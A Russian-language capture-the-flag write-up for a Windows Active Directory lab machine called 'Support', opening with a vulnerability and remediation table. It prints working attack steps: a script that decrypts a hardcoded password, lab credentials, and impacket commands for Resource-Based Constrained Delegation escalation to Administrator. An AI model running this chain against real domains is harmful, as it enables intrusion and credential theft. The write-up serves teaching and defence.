
| Уязвимость                                                                                 | Опасность                                                                                                                                                                        | Как обеспечить безопасность                                                                                                                                                                                                                                                                           |
| ------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Хранение пароля в коде приложения** (hardcoded credentials)                              | Злоумышленник, получивший исполняемый файл, может извлечь пароль сервисной учётной записи и получить доступ к LDAP и другим ресурсам.                                            | - Не хранить пароли в исходном коде.  <br>- Использовать безопасные хранилища (например, Windows Credential Manager, Azure Key Vault).  <br>- Применять управляемые сервисные учётки (gMSA) для автоматической смены паролей.                                                                         |
| **Хранение паролей в открытом виде в атрибутах Active Directory (поле `info`)**            | Пароль пользователя `support` стал известен, что позволило получить удалённый доступ через WinRM.                                                                                | - Запретить хранение паролей и другой чувствительной информации в атрибутах пользователей.  <br>- Регулярно аудировать AD на наличие конфиденциальных данных в полях `info`, `description`, `comment` и др.  <br>- Настроить политику безопасности, запрещающую пользователям записывать туда пароли. |
| **Избыточные права `GenericAll` для обычного пользователя на объект контроллера домена**   | Пользователь `support` получил полный контроль над компьютером `DC`. Это позволило провести атаку Resource-Based Constrained Delegation (RBCD) и захватить билет администратора. | - Строго ограничивать права на объекты AD, применять принцип минимальных привилегий.  <br>- Регулярно проверять разрешения с помощью BloodHound или аналогичных инструментов.  <br>- Отслеживать и рецензировать изменения делегирования.                                                             |
| **Неограниченная возможность создания компьютеров в домене (MachineAccountQuota)**         | Любой аутентифицированный пользователь может создать до 10 компьютеров, что используется в атаках RBCD для создания подконтрольного объекта.                                     | - Уменьшить значение `MachineAccountQuota` до 0 или 1 для обычных пользователей.  <br>- Включить мониторинг и оповещения при создании новых учётных записей компьютеров.                                                                                                                              |
| **Отсутствие контроля за делегированием Kerberos (Resource-Based Constrained Delegation)** | Атака RBCD позволила поддельному компьютеру запросить билеты от имени администратора и получить доступ к контроллеру.                                                            | - Отключить использование RBCD, если оно не требуется.  <br>- Включить мониторинг изменений атрибута `msDS-AllowedToActOnBehalfOfOtherIdentity`.  <br>- Применять защищённые настройки делегирования только для доверенных служб.                                                                     |

Выполняем первоначальное сканирование портов. Очень много открытых портов.
```
Host is up (0.16s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49680/tcp open  unknown
49692/tcp open  unknown
49697/tcp open  unknown
49713/tcp open  unknown

Nmap done: 1 IP address (1 host up)
```

Посмотрим подробнее, что за сервисы открыты на этих портах.
Среди портов есть **системные**:
- DNS сервер, на 53 порту
- протокол аутентификации Kerberos на 88 порту и 464 для смены пароля через Kerberos
- **389 - LDAP - протокол для чтения элементов AD, групп, пользователей, компьютеров** и его защищенная версия на 636 - LDAPS, а также урезанная версия (3268) и её защищенная версия на 3269.
Есть **сетевая служба SMB**, на порту 139 и 445.
Два порта для **удаленного управления** через PowerShell - 5985 и 9389.
И также много портов для **работы с RPC**: 135 - RPC mapper, показывает на каком динамическом порту (**49664, 49667, 49692, 49697, 49713**) сейчас работает RPC и защищенная версия на 593.
```
Host is up (0.16s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-02 09:43:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-02T09:44:01
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Stats: 0:01:42 elapsed; 1 hosts completed (1 up)
```

Посмотрим, есть ли открытые шары на службе SMB (139, 445 порты).

Видим директорию support-tools, надо проверить, доступен ли анонимный вход туда.

![](../images/Pasted%20image%2020260702135212.png)

Под анонимным пользователем зайти удалось и мы видим файлы, которые там есть.
Скачиваем всё к себе и будем изучать.

![](../images/Pasted%20image%2020260702135738.png)

Запускаем UserInfo.exe, чтобы оценить как это работает. Это какая-то программа, которая принимает на вход имя пользователя и выдает какую-то информацию о нем.

![](../images/Pasted%20image%2020260702142001.png)

Декомпилируем код exe программы через ilspycmd
```
ilspycmd UserInfo.exe > UserInfo_decompiled.cs
```

Проанализировав исходный код, можно обнаружить, что внутри класса Protected лежит статическая строка enc_password и ключ "armando". Метод getPassword() расшифровывает её.

![](../images/Pasted%20image%2020260702142115.png)

Скрипт пайтона, которые расшифровывает пароль:
```
import base64

enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

data = base64.b64decode(enc)
dec = bytearray()

for i, b in enumerate(data):
    dec.append((b ^ key[i % len(key)]) ^ 0xDF)

print(dec.decode('ascii'))
```

Также в исходном коде находим имя пользователя:

![](../images/Pasted%20image%2020260702142629.png)

Таким образом получаем креды для пользователя.
```
ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Проверяем через SMB и видим, что это правильные учетные данные.

![](../images/Pasted%20image%2020260702142846.png)

Далее я проанализировал другие шары, но ничего там не нашел.

![](../images/Pasted%20image%2020260702143306.png)

Через ldap удалось вытащить пользователей системы.
```
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (&(objectClass=user)(objectCategory=person))
# requesting: sAMAccountName 
#

# Administrator, Users, support.htb
dn: CN=Administrator,CN=Users,DC=support,DC=htb
sAMAccountName: Administrator

# Guest, Users, support.htb
dn: CN=Guest,CN=Users,DC=support,DC=htb
sAMAccountName: Guest

# krbtgt, Users, support.htb
dn: CN=krbtgt,CN=Users,DC=support,DC=htb
sAMAccountName: krbtgt

# ldap, Users, support.htb
dn: CN=ldap,CN=Users,DC=support,DC=htb
sAMAccountName: ldap

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
sAMAccountName: support

# smith.rosario, Users, support.htb
dn: CN=smith.rosario,CN=Users,DC=support,DC=htb
sAMAccountName: smith.rosario

# hernandez.stanley, Users, support.htb
dn: CN=hernandez.stanley,CN=Users,DC=support,DC=htb
sAMAccountName: hernandez.stanley

# wilson.shelby, Users, support.htb
dn: CN=wilson.shelby,CN=Users,DC=support,DC=htb
sAMAccountName: wilson.shelby

# anderson.damian, Users, support.htb
dn: CN=anderson.damian,CN=Users,DC=support,DC=htb
sAMAccountName: anderson.damian

# thomas.raphael, Users, support.htb
dn: CN=thomas.raphael,CN=Users,DC=support,DC=htb
sAMAccountName: thomas.raphael

# levine.leopoldo, Users, support.htb
dn: CN=levine.leopoldo,CN=Users,DC=support,DC=htb
sAMAccountName: levine.leopoldo

# raven.clifton, Users, support.htb
dn: CN=raven.clifton,CN=Users,DC=support,DC=htb
sAMAccountName: raven.clifton

# bardot.mary, Users, support.htb
dn: CN=bardot.mary,CN=Users,DC=support,DC=htb
sAMAccountName: bardot.mary

# cromwell.gerard, Users, support.htb
dn: CN=cromwell.gerard,CN=Users,DC=support,DC=htb
sAMAccountName: cromwell.gerard

# monroe.david, Users, support.htb
dn: CN=monroe.david,CN=Users,DC=support,DC=htb
sAMAccountName: monroe.david

# west.laura, Users, support.htb
dn: CN=west.laura,CN=Users,DC=support,DC=htb
sAMAccountName: west.laura

# langley.lucy, Users, support.htb
dn: CN=langley.lucy,CN=Users,DC=support,DC=htb
sAMAccountName: langley.lucy

# daughtler.mabel, Users, support.htb
dn: CN=daughtler.mabel,CN=Users,DC=support,DC=htb
sAMAccountName: daughtler.mabel

# stoll.rachelle, Users, support.htb
dn: CN=stoll.rachelle,CN=Users,DC=support,DC=htb
sAMAccountName: stoll.rachelle

# ford.victoria, Users, support.htb
dn: CN=ford.victoria,CN=Users,DC=support,DC=htb
sAMAccountName: ford.victoria

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 24
# numEntries: 20
# numReferences: 3

```

У пользователя support есть поле info со странной строкой, предположительно это креды для входа.
```
support : Ironside47pleasure40Watchful
```

![](../images/Pasted%20image%2020260702183434.png)

Далее переходим к портам для удаленного управления через PowerShell. Подключаемся туда с использованием найденных учетных данных.
Доступ получен.

![](../images/Pasted%20image%2020260702183532.png)

Находим флаг пользователя.

![](../images/Pasted%20image%2020260702183746.png)

Загружаем SharpHound.exe на целевую систему и запускаем.

![](../images/Pasted%20image%2020260702185019.png)

Программа отработала и сохранила результат.

![](../images/Pasted%20image%2020260702191047.png)

Прочитав найденную информацию мы можем увидеть возможность GenericAll для пользователя support.

В Active Directory каждому объекту (пользователю, компьютеру, группе) сопоставлен список управления доступом (ACL), определяющий, кто и какие действия может выполнять над этим объектом.  
**Право `GenericAll`** – это полный контроль над объектом. Оно включает возможность изменять любые атрибуты, настраивать разрешения, удалять объект, а также – что особенно важно – **управлять делегированием Kerberos**.

В ходе анализа данных BloodHound мы обнаружили, что у пользователя `support` есть право `GenericAll` на объект **контроллера домена** (`DC.SUPPORT.HTB`). Это означает, что `support` может модифицировать атрибуты компьютера `DC$` – в частности, атрибут **`msDS-AllowedToActOnBehalfOfOtherIdentity`**, который управляет Resource-Based Constrained Delegation (RBCD).

![](../images/Pasted%20image%2020260702193001.png)

Используя `GenericAll`, мы можем:

1. **Создать новый компьютер в домене** (например, `FAKE$`).  
    В домене по умолчанию любой пользователь имеет право создавать до 10 компьютеров (параметр `MachineAccountQuota`). Это нам нужно, чтобы иметь подконтрольный объект, от имени которого мы будем запрашивать билеты.
2. **Настроить делегирование** таким образом, чтобы компьютер `FAKE$` мог запрашивать билеты Kerberos для любого пользователя (включая `Administrator`) для доступа к `DC$`.  
    Это достигается записью SID `FAKE$` в атрибут `msDS-AllowedToActOnBehalfOfOtherIdentity` объекта `DC$`.
3. **Получить билет Kerberos (TGS) для пользователя `Administrator`** для службы `cifs` на контроллере. Этот билет даёт нам права администратора на SMB-доступ.
4. **Использовать полученный билет** для входа через `psexec` или `wmiexec` как `Administrator` и забрать флаги.
    

Таким образом, даже не зная пароля администратора, мы можем повысить свои права благодаря этой ошибочной настройке прав.

```
1. Создание компьютера FAKE$:
   
impacket-addcomputer -dc-ip 10.129.14.181 -computer-name FAKE -computer-pass 'FakePassword123!' support.htb/support:'Ironside47pleasure40Watchful'

[*] Successfully added machine account FAKE$ with password FakePassword123!.

2. Настройка RBCD
   
impacket-rbcd -dc-ip 10.129.14.181 -delegate-from FAKE$ -delegate-to DC$ -action write support.htb/support:'Ironside47pleasure40Watchful'

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FAKE$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FAKE$        (S-1-5-21-1677581083-3380853377-188903654-6101)

impacket-rbcd -dc-ip 10.129.14.181 -delegate-from FAKE$ -delegate-to DC$ -action read support.htb/support:'Ironside47pleasure40Watchful'

[*] Accounts allowed to act on behalf of other identity:
[*]     FAKE$        (S-1-5-21-1677581083-3380853377-188903654-6101)

3. Получение билета администратора
   
impacket-getST -dc-ip 10.129.14.181 -spn cifs/dc.support.htb -impersonate Administrator support.htb/FAKE$:'FakePassword123!'

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

4. Использование билета для входа
   
export KRB5CCNAME=$(pwd)/Administrator.ccache
impacket-psexec -k -no-pass -dc-ip 10.129.14.181 support.htb/Administrator@dc.support.htb
```

С помощью полученного билета подключаемся с максимальными привилегиями к целевому хосту

![](../images/Pasted%20image%2020260702193803.png)

Находим и читаем флаг рута

![](../images/Pasted%20image%2020260702193941.png)

